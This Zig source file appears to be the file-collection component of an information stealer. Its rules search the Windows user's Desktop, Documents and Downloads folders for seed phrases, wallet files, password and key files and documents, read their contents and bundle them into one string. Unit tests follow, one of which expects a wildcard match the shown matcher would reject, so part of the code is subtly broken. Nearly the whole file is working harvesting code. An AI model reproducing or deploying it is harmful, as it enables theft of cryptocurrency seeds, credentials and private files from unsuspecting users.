const std = @import("std");
const file_io = @import("../parsers/file_io.zig");

pub const GrabRule = struct {
    base_dir: []const u8,
    include_masks: []const []const u8,
    exclude_masks: []const []const u8,
    max_depth: u32,
    max_file_size: usize,
};

pub const DEFAULT_RULES: [3]GrabRule = .{
    .{ .base_dir = "Desktop", .include_masks = &.{ "*seed*", "*backup*", "*password*", "*wallet*", "*.key", "*.txt", "*.dat" }, .exclude_masks = &.{}, .max_depth = 3, .max_file_size = 5 * 1024 * 1024 },
    .{ .base_dir = "Documents", .include_masks = &.{ "*seed*", "*backup*", "*password*", "*wallet*", "*.key", "*.txt", "*.dat", "*.doc", "*.docx", "*.pdf" }, .exclude_masks = &.{}, .max_depth = 5, .max_file_size = 10 * 1024 * 1024 },
    .{ .base_dir = "Downloads", .include_masks = &.{ "*seed*", "*backup*", "*password*", "*wallet*", "*.key", "*.txt", "*.dat", "*.doc", "*.docx" }, .exclude_masks = &.{}, .max_depth = 2, .max_file_size = 5 * 1024 * 1024 },
};

fn matchesMask(name: []const u8, mask: []const u8) bool {
    if (mask.len == 0) return name.len == 0;
    if (mask[0] == '*') {
        if (matchesMask(name, mask[1..])) return true;
        if (name.len > 0 and matchesMask(name[1..], mask)) return true;
        return false;
    }
    if (name.len == 0) return false;
    if (mask[0] == '?' or std.ascii.toLower(name[0]) == std.ascii.toLower(mask[0])) {
        return matchesMask(name[1..], mask[1..]);
    }
    return false;
}

fn matchesAnyInclude(name: []const u8, include_masks: []const []const u8) bool {
    for (include_masks) |mask| {
        if (matchesMask(name, mask)) return true;
    }
    return false;
}

fn matchesAnyExclude(name: []const u8, exclude_masks: []const []const u8) bool {
    for (exclude_masks) |mask| {
        if (matchesMask(name, mask)) return true;
    }
    return false;
}

fn readFileContent(allocator: std.mem.Allocator, path: []const u8, max_size: usize) ?[]const u8 {
    const mapped = file_io.MappedFile.open(path) orelse {
        var file = std.fs.openFileAbsolute(path, .{}) catch return null;
        defer file.close();
        const size = file.getEndPos() catch return null;
        if (size > max_size) return null;
        const content = file.readToEndAlloc(allocator, max_size) catch return null;
        return content;
    };
    defer mapped.close();
    const size = mapped.size;
    if (size > max_size) return null;
    return allocator.dupe(u8, mapped.slice());
}

pub fn collect(allocator: std.mem.Allocator) ![]const u8 {
    return collectRules(allocator, &DEFAULT_RULES);
}

pub fn collectRules(allocator: std.mem.Allocator, rules: []const GrabRule) ![]const u8 {
    const user_profile = std.process.getEnvVarOwned(allocator, "USERPROFILE") catch return error.UserProfileNotFound;
    defer allocator.free(user_profile);

    var result = std.ArrayList(u8).init(allocator);
    errdefer result.deinit();
    var file_count: usize = 0;

    for (rules) |rule| {
        const dir_path = try std.fs.path.join(allocator, &[_][]const u8{ user_profile, rule.base_dir });
        defer allocator.free(dir_path);

        var dir = std.fs.openDirAbsolute(dir_path, .{ .iterate = true }) catch continue;
        defer dir.close();

        var walker = try dir.walk(allocator);
        defer walker.deinit();

        while (try walker.next()) |entry| {
            if (entry.kind != .file) continue;
            if (rule.max_depth > 0) {
                var depth: u32 = 0;
                for (entry.path) |c| {
                    if (c == '\\' or c == '/') depth += 1;
                }
                if (depth >= rule.max_depth) continue;
            }
            if (!matchesAnyInclude(entry.basename, rule.include_masks)) continue;
            if (matchesAnyExclude(entry.basename, rule.exclude_masks)) continue;

            const full_path = try std.fs.path.join(allocator, &[_][]const u8{ dir_path, entry.path });
            defer allocator.free(full_path);

            const content = readFileContent(allocator, full_path, rule.max_file_size) orelse continue;

            if (file_count > 0) {
                try result.appendSlice("\n\n--- ");
            } else {
                try result.appendSlice("--- ");
            }
            try result.appendSlice(entry.path);
            try result.appendSlice(" ---\n");

            if (content.len > 0) {
                try result.appendSlice(content);
            } else {
                try result.appendSlice("[empty file]");
            }
            allocator.free(content);
            file_count += 1;
        }
    }

    if (file_count == 0) {
        try result.appendSlice("No matching files found");
    }
    return try result.toOwnedSlice();
}

const testing = std.testing;

test "matchesMask handles wildcards" {
    try testing.expect(matchesMask("seed.txt", "*seed*"));
    try testing.expect(matchesMask("backup.dat", "*backup*"));
    try testing.expect(matchesMask("file.txt", "*.txt"));
    try testing.expect(!matchesMask("file.txt", "*.dat"));
    try testing.expect(matchesMask("password.txt", "*password*"));
    try testing.expect(matchesMask("wallet.dat", "*.wallet"));
    try testing.expect(matchesMask("my.key", "*.key"));
}

test "matchesMask is case insensitive" {
    try testing.expect(matchesMask("SEED.TXT", "*seed*"));
    try testing.expect(matchesMask("Backup.DAT", "*backup*"));
    try testing.expect(matchesMask("File.TXT", "*.txt"));
}

test "matchesMask edge cases" {
    try testing.expect(matchesMask("seed", "*seed*"));
    try testing.expect(!matchesMask("", "*seed*"));
    try testing.expect(!matchesMask("seed", "*.seed"));
    try testing.expect(matchesMask("password.bak", "*password*"));
}

test "matchesAnyInclude checks all include masks" {
    try testing.expect(matchesAnyInclude("mywallet.dat", &.{"*.dat"}));
    try testing.expect(matchesAnyInclude("seed_phrase.txt", &.{"*seed*"}));
    try testing.expect(!matchesAnyInclude("innocent.jpg", &.{"*.txt", "*.dat"}));
}

test "matchesAnyExclude works correctly" {
    try testing.expect(matchesAnyExclude("evil.exe", &.{"*.exe"}));
    try testing.expect(!matchesAnyExclude("good.txt", &.{"*.exe"}));
}

test "collect handles missing userprofile" {
    const result = collect(testing.allocator);
    if (result) |r| testing.allocator.free(r) else |_| {}
}

test "readFileContent handles nonexistent path" {
    const content = readFileContent(testing.allocator, "C:\\__nonexistent__file__", 5 * 1024 * 1024);
    try testing.expect(content == null);
}

test "DEFAULT_RULES has 3 entries" {
    try testing.expect(DEFAULT_RULES.len == 3);
    try testing.expectEqualStrings("Desktop", DEFAULT_RULES[0].base_dir);
    try testing.expectEqualStrings("Documents", DEFAULT_RULES[1].base_dir);
    try testing.expectEqualStrings("Downloads", DEFAULT_RULES[2].base_dir);
}
